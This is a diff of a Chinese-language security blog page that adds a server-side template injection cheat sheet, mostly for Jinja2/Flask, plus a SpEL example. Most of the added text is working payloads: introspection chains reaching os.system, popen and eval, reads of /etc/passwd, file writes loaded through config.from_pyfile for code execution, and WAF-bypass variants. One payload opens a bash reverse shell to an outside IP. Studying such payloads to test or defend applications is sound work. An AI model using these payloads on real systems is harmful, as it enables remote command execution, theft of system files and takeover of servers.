@@ -82,7 +82,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">2.5k</span>
+            <span class="post-count">3.7k</span>
         </span>
     </span>
 
@@ -91,7 +91,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">10 min</span>
+            <span class="post-count">16 min</span>
         </span>
     </span>
 </div>
@@ -202,6 +202,45 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line"></span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&#x27;cat etc/passwd&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这里面的 T() 是 EL 的语法规定（比如 Spring 框架的 EL 就是 SPEL)</p>
+<h2 id="二、开始运用"><a href="#二、开始运用" class="headerlink" title="二、开始运用"></a>二、开始运用</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2354192/1599480440997-00e10dda-bb44-4fe7-9b87-2a8de03b598d.png"></p>
+<p>这张图可以说是百试百灵了，然后接下来我们继续根据不同的模版和语言特性进行常用payload的使用总结</p>
+<h3 id="Jinja2使用"><a href="#Jinja2使用" class="headerlink" title="Jinja2使用"></a>Jinja2使用</h3><h3 id="1-flask的全局变量"><a href="#1-flask的全局变量" class="headerlink" title="1.flask的全局变量"></a>1.flask的全局变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config 保存着隐私信息</span><br><span class="line">config.from_object(&#39;os&#39;) </span><br><span class="line">request.environ是一个字典，其中包含和服务器环境相关的对象 </span><br></pre></td></tr></table></figure>
+
+<h3 id="2-python强大的内省特性"><a href="#2-python强大的内省特性" class="headerlink" title="2.python强大的内省特性"></a>2.python强大的内省特性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">总结:</span><br><span class="line">通过某种类型(字符串:&quot;&quot;，list:[]，int：1)开始引出，__class__找到当前类，__mro__或者__base__找到__object__，前边的语句构造都是要找这个。然后利用object找到能利用的类。还有就是&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)&#125;&#125;这种的，能执行，但是不会回显。一般来说，python2的话用file就行，python3则没有这个属性。</span><br></pre></td></tr></table></figure>
+
+<p>常见的内省函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__builtins__</span><br><span class="line">__import__</span><br><span class="line">__class__返回调用的参数类型。</span><br><span class="line">__base__返回基类</span><br><span class="line">__mro__允许我们在当前Python环境下追溯继承树</span><br><span class="line">__subclasses__()返回子类</span><br><span class="line">builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块</span><br></pre></td></tr></table></figure>
+
+<p>常见的寻找过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__base__.__subclasses__()</span><br><span class="line"># 返回子类的列表 [,,,...]</span><br><span class="line">#从中随便选一个类,查看它的__init__</span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__subclasses__()[30].__init__</span><br><span class="line">&lt;slot wrapper &#39;__init__&#39; of &#39;object&#39; objects&gt;</span><br><span class="line"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span><br><span class="line"></span><br><span class="line">#再换几个子类，很快就能找到一个重载过__init__的类，比如</span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__subclasses__()[5].__init__</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__subclasses__()[5].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</span><br><span class="line">#然后用eval执行命令即可</span><br></pre></td></tr></table></figure>
+
+<p>安全研究员给出的常用的payload</p>
+<p>文件读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#读文件</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;  </span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class="line">#写文件</span><br><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;1&#39;).write(&quot;&quot;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>任意执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;owned.cfg&#39;,&#39;w&#39;).write(&#39;code&#39;)&#125;&#125; </span><br><span class="line">&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;owned.cfg&#39;) &#125;&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>写入一次</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;owned.cfg&#39;,&#39;w&#39;).write(&#39;from subprocess import check_output\n\nRUNCMD &#x3D; check_output\n&#39;)&#125;&#125;  </span><br><span class="line">&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;owned.cfg&#39;) &#125;&#125;  </span><br><span class="line">&#123;&#123; config[&#39;RUNCMD&#39;](&#39;&#x2F;usr&#x2F;bin&#x2F;id&#39;,shell&#x3D;True) &#125;&#125; </span><br></pre></td></tr></table></figure>
+
+<p>不回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;eval&#39;](&#39;1+1&#39;)&#125;&#125;      </span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;(这条指令可以注入，但是如果直接进入python2打这个poc，会报错，用下面这个就不会，可能是python启动会加载了某些模块)  </span><br><span class="line">http:&#x2F;&#x2F;39.105.116.195&#x2F;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;(system函数换为popen(&#39;&#39;).read()，需要导入os模块)  </span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;(不需要导入os模块，直接从别的模块调用)</span><br></pre></td></tr></table></figure>
+
+<p>python3</p>
+<p>文件读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27&#x2F;etc&#x2F;passwd%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>命令执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>脚本使用示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ttp:&#x2F;&#x2F;192.168.228.36&#x2F;?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;ImmutableDictMixin&#39; %&#125;&#123;&#123; c.__hash__.__globals__[&#39;__builtins__&#39;].eval(&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">绕waf</span><br><span class="line">python2：</span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&quot;ls&quot;)&#39;)</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39;+&#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.6.6.6&#x2F;9999 0&gt;&amp;1&quot;&#39;)</span><br><span class="line"></span><br><span class="line">python3：</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;]</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
+
  
       <!-- reward -->
       
